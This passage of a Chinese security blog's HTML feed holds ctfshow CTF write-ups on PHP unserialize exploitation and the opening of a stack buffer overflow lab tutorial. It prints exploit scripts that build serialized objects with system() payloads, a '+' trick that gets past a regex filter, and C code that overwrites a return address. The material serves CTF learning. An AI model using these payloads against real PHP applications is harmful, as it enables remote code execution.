class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>    <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br></code></pre></td></tr></table></figure><table><thead><tr><th>特性</th><th><code>__construct</code></th><th><code>__destruct</code></th></tr></thead><tbody><tr><td><strong>调用时机</strong></td><td>对象创建时</td><td>对象销毁时</td></tr><tr><td><strong>主要用途</strong></td><td>初始化对象属性</td><td>清理资源和收尾工作</td></tr><tr><td><strong>调用方式</strong></td><td>自动（使用 <code>new</code>）</td><td>自动（对象销毁时）</td></tr><tr><td><strong>参数</strong></td><td>可以接受参数</td><td>不能接受参数</td></tr><tr><td><strong>返回值</strong></td><td>无特殊要求</td><td>无特殊要求</td></tr></tbody></table><p>虽然我们不能改变类方法，但我们可以改变类的属性</p><p>我们可以将class修改的值修改为一个backDoor对象，对backDoor类中的code属性进行赋值来达到rce</p><p>username和password只需要存在即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;1&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;2&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;info&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>=<span class="hljs-title">new</span> <span class="hljs-title">backDoor</span>();</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class">&#125;</span><br><span class="hljs-class"><span class="hljs-title">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">&#x27;system(&quot;cat flag.php&quot;);&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>()));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$user</span>;<br><span class="hljs-meta">?&gt;</span><br><br><br></code></pre></td></tr></table></figure><h3 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;info&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>=<span class="hljs-title">new</span> <span class="hljs-title">info</span>();</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class">    <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">login</span>($<span class="hljs-title">u</span>,$<span class="hljs-title">p</span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>-&gt;<span class="hljs-title">getInfo</span>();</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class"></span><br><span class="hljs-class">&#125;</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">class</span> <span class="hljs-title">info</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;user;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>    &#125;<br>    <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="如果匹配到O-8或者是O-11或者是O-3这样O后面跟着冒号和数字的就被pass掉"><a href="#如果匹配到O-8或者是O-11或者是O-3这样O后面跟着冒号和数字的就被pass掉" class="headerlink" title="如果匹配到O:8或者是O:11或者是O:3这样O后面跟着冒号和数字的就被pass掉"></a>如果匹配到O:8或者是O:11或者是O:3这样O后面跟着冒号和数字的就被pass掉</h4><p>给数字加上<code>+</code>来绕过。</p><p>为什么是用加号，实验得出来的，+11和11序列化后的结果都是一样的</p><p>exp(属性有变化)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;1&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;2&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;backDoor&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>=<span class="hljs-title">new</span> <span class="hljs-title">backDoor</span>();</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class">&#125;</span><br><span class="hljs-class"><span class="hljs-title">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">&#x27;system(&quot;ls&quot;);&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>());<br><span class="hljs-variable">$user1</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;:11&#x27;</span>,<span class="hljs-string">&#x27;:+11&#x27;</span>,<span class="hljs-variable">$user</span>);<br><span class="hljs-variable">$user2</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;:8&#x27;</span>,<span class="hljs-string">&#x27;:+8&#x27;</span>,<span class="hljs-variable">$user1</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$user2</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h3><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$xff</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);<span class="hljs-comment">#_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;] 中的字符串按照逗号（,）分割成一个数组，并将这个数组赋值给变量 $xff。</span><br><span class="hljs-title function_ invoke__">array_pop</span>(<span class="hljs-variable">$xff</span>);<span class="hljs-comment">#array_pop()移除了 $xff 数组中的最后一个元素</span><br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">array_pop</span>(<span class="hljs-variable">$xff</span>);<span class="hljs-comment">#array_pop() 函数，这次它移除了 $xff 数组中剩余元素的最后一个（即倒数第二个 IP 地址，如果原始字符串中只有一个 IP 地址，则这个调用会移除那个唯一的 IP 地址），并将这个 IP 地址赋值给变量 $ip。</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span>!==<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<span class="hljs-comment">#检查ip地址是否为本地回环地址</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$token</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;token&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$token</span>==<span class="hljs-string">&#x27;ctfshow&#x27;</span>)&#123;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>,<span class="hljs-variable">$flag</span>);<span class="hljs-comment">#检查 $token 是否等于 &#x27;ctfshow&#x27;。如果等于，尝试将 $flag 变量的内容写入名为 &#x27;flag.txt&#x27; 的文件。</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>对上面的代码加以解释</p><h3 id="explode-函数"><a href="#explode-函数" class="headerlink" title="explode()函数"></a>explode()函数</h3><p><code>explode()</code> 函数是 PHP 中用于将字符串按照指定的分隔符分割成数组的内置函数</p><h3 id="array-pop函数"><a href="#array-pop函数" class="headerlink" title="array_pop函数"></a>array_pop函数</h3><p><code>array_pop()</code> 是 PHP 中的一个数组函数，它用于移除数组中的最后一个元素并返回该元素的值。这个函数会修改原始数组，使其少了最后一个元素。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$fruits</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;apple&quot;</span>, <span class="hljs-string">&quot;banana&quot;</span>, <span class="hljs-string">&quot;orange&quot;</span>);<br><span class="hljs-variable">$lastFruit</span> = <span class="hljs-title function_ invoke__">array_pop</span>(<span class="hljs-variable">$fruits</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Last fruit: &quot;</span> . <span class="hljs-variable">$lastFruit</span>; <span class="hljs-comment">// 输出 &quot;Last fruit: orange&quot;</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$fruits</span>); <span class="hljs-comment">// 输出：Array ( [0] =&gt; apple [1] =&gt; banana )</span><br></code></pre></td></tr></table></figure><p>刚开始看这道题的时候也是一点办法都没有，因为这里一个类也没有，也不知道怎么构造pop链，然后就去看了wp，由于源代码中没有出现任何的类和getflag方法，我们需要调用一个不存在的方法，这时可以想到触发__call魔术方法。这里观察代码明显发现并没有相关的类可以利用，所以想到利用原生类进行反序列化利用。发现这里考的是PHP原生类，那我们就先了解一下知识点</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>缓冲区溢出与栈粉碎</title>
    <link href="/2025/03/02/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E4%B8%8E%E6%A0%88%E7%B2%89%E7%A2%8E/"/>
    <url>/2025/03/02/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E4%B8%8E%E6%A0%88%E7%B2%89%E7%A2%8E/</url>
    
    <content type="html"><![CDATA[<p><img src="/../images/f73f82a2-773f-4838-834e-360d7b1925b6.png" alt="f73f82a2-773f-4838-834e-360d7b1925b6"></p><h1 id="缓冲区溢出实验教程"><a href="#缓冲区溢出实验教程" class="headerlink" title="缓冲区溢出实验教程"></a>缓冲区溢出实验教程</h1><h2 id="实验环境准备"><a href="#实验环境准备" class="headerlink" title="实验环境准备"></a>实验环境准备</h2><ol><li>使用VMware Player或VirtualBox打开RH7.2虚拟机</li><li>使用用户名<code>hacker</code>和密码<code>password</code>登录</li><li>找到实验文件：<code>/home/hacker/notes/bufferoverruns/stack.c</code></li></ol><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="1-查看和理解源代码"><a href="#1-查看和理解源代码" class="headerlink" title="1. 查看和理解源代码"></a>1. 查看和理解源代码</h3><p>首先查看<code>stack.c</code>文件的内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">hacked</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You have been hacked!\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">returnInput</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">char</span> c[<span class="hljs-number">4</span>];<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-comment">// 初始化数组（这里存在缓冲区溢出漏洞）</span><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; i++) &#123;  <span class="hljs-comment">// 注意：这里应该是i &lt; 4，但写成了i &lt;= 4</span><br>        c[i] = <span class="hljs-string">&#x27;A&#x27;</span>;<br>        sum += c[i];<br>    &#125;<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sum is: %d\n&quot;</span>, sum);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    returnInput();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-编译程序"><a href="#2-编译程序" class="headerlink" title="2. 编译程序"></a>2. 编译程序</h3><p>使用调试符号编译程序，以便使用GDB调试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -g -o stack stack.c<br></code></pre></td></tr></table></figure><h3 id="3-使用GDB调试程序"><a href="#3-使用GDB调试程序" class="headerlink" title="3. 使用GDB调试程序"></a>3. 使用GDB调试程序</h3><p>启动GDB调试器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gdb stack<br></code></pre></td></tr></table></figure><h3 id="4-设置断点和分析内存"><a href="#4-设置断点和分析内存" class="headerlink" title="4. 设置断点和分析内存"></a>4. 设置断点和分析内存</h3><p>在GDB中执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gdb"># 在sum=0处设置断点<br>break returnInput<br><br># 运行程序<br>run<br><br># 查看当前堆栈帧内容<br>x/24w $esp<br><br># 单步执行代码<br>step<br><br># 继续查看堆栈变化<br>x/24w $esp<br></code></pre></td></tr></table></figure><h3 id="5-理解小端字节序"><a href="#5-理解小端字节序" class="headerlink" title="5. 理解小端字节序"></a>5. 理解小端字节序</h3><p>x86架构使用小端字节序，这意味着多字节数据的低位字节存储在低地址。例如，32位值<code>0xB3B2B1B0</code>在内存中的存储方式为：</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">地址 0</span><span class="hljs-punctuation">:</span> <span class="hljs-string">B0</span><br><span class="hljs-attribute">地址 1</span><span class="hljs-punctuation">:</span> <span class="hljs-string">B1</span><br><span class="hljs-attribute">地址 2</span><span class="hljs-punctuation">:</span> <span class="hljs-string">B2</span><br><span class="hljs-attribute">地址 3</span><span class="hljs-punctuation">:</span> <span class="hljs-string">B3</span><br></code></pre></td></tr></table></figure><h3 id="6-修改代码实现缓冲区溢出攻击"><a href="#6-修改代码实现缓冲区溢出攻击" class="headerlink" title="6. 修改代码实现缓冲区溢出攻击"></a>6. 修改代码实现缓冲区溢出攻击</h3><p>修改<code>stack.c</code>文件，通过四个赋值语句覆盖返回地址，使其指向<code>hacked()</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">hacked</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You have been hacked!\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">returnInput</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">char</span> c[<span class="hljs-number">4</span>];<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-comment">// 获取hacked函数的地址</span><br>    <span class="hljs-type">void</span> (*hackedPtr)() = hacked;<br>    <br>    <span class="hljs-comment">// 通过四个赋值覆盖返回地址</span><br>    <span class="hljs-comment">// 注意：这需要根据实际内存布局调整偏移量</span><br>    c[<span class="hljs-number">8</span>] = (<span class="hljs-type">char</span>)((<span class="hljs-type">long</span>)hackedPtr &amp; <span class="hljs-number">0xFF</span>);         <span class="hljs-comment">// 最低位字节</span><br>    c[<span class="hljs-number">9</span>] = (<span class="hljs-type">char</span>)(((<span class="hljs-type">long</span>)hackedPtr &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>);<br>    c[<span class="hljs-number">10</span>] = (<span class="hljs-type">char</span>)(((<span class="hljs-type">long</span>)hackedPtr &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>);<br>    c[<span class="hljs-number">11</span>] = (<span class="hljs-type">char</span>)(((<span class="hljs-type">long</span>)hackedPtr &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>); <span class="hljs-comment">// 最高位字节</span><br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sum is: %d\n&quot;</span>, sum);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    returnInput();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="7-确定正确的偏移量"><a href="#7-确定正确的偏移量" class="headerlink" title="7. 确定正确的偏移量"></a>7. 确定正确的偏移量</h3><p>要成功利用漏洞，需要找到正确的偏移量来覆盖返回地址：</p><ol><li>使用GDB分析堆栈布局</li><li>找到返回地址在堆栈中的位置</li><li>计算与缓冲区起始地址的偏移</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gdb"># 在returnInput函数开始处设置断点<br>break returnInput<br>run<br><br># 查看堆栈指针<br>print $esp<br><br># 查看返回地址位置<br>info frame<br><br># 查看缓冲区地址<br>print &amp;c<br></code></pre></td></tr></table></figure><h3 id="8-最终利用代码"><a href="#8-最终利用代码" class="headerlink" title="8. 最终利用代码"></a>8. 最终利用代码</h3><p>根据实际偏移量调整代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">hacked</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You have been hacked!\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">returnInput</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">char</span> c[<span class="hljs-number">4</span>];<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-comment">// 假设通过分析发现返回地址在c[8]到c[11]的位置</span><br>    <span class="hljs-comment">// 获取hacked函数的地址</span><br>    <span class="hljs-type">long</span> hackedAddr = (<span class="hljs-type">long</span>)hacked;<br>    <br>    <span class="hljs-comment">// 通过四个赋值覆盖返回地址</span><br>    c[<span class="hljs-number">8</span>] = hackedAddr &amp; <span class="hljs-number">0xFF</span>;           <span class="hljs-comment">// 最低位字节</span><br>    c[<span class="hljs-number">9</span>] = (hackedAddr &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>;<br>    c[<span class="hljs-number">10</span>] = (hackedAddr &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>;<br>    c[<span class="hljs-number">11</span>] = (hackedAddr &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>;  <span class="hljs-comment">// 最高位字节</span><br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sum is: %d\n&quot;</span>, sum);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    returnInput();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ol><li><strong>栈内存布局</strong>：函数调用时，返回地址存储在栈上，位于局部变量之后</li><li><strong>缓冲区溢出</strong>：当向数组写入数据时，如果没有正确检查边界，可能会覆盖相邻的内存区域</li><li><strong>返回地址覆盖</strong>：通过精心构造的输入，可以覆盖返回地址，使程序执行任意代码</li><li><strong>小端字节序</strong>：x86架构使用小端字节序，需要按正确顺序写入地址字节</li></ol><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><ol><li>使用<code>x/24w $esp</code>查看堆栈内容</li><li>使用<code>step</code>命令单步执行代码</li><li>使用<code>print &amp;variable</code>查看变量地址</li><li>使用<code>info frame</code>查看当前栈帧信息</li></ol><h2 id="函数调用时的内存"><a href="#函数调用时的内存" class="headerlink" title="函数调用时的内存"></a>函数调用时的内存</h2><h3 id="1-栈内存布局"><a href="#1-栈内存布局" class="headerlink" title="1. 栈内存布局"></a>1. 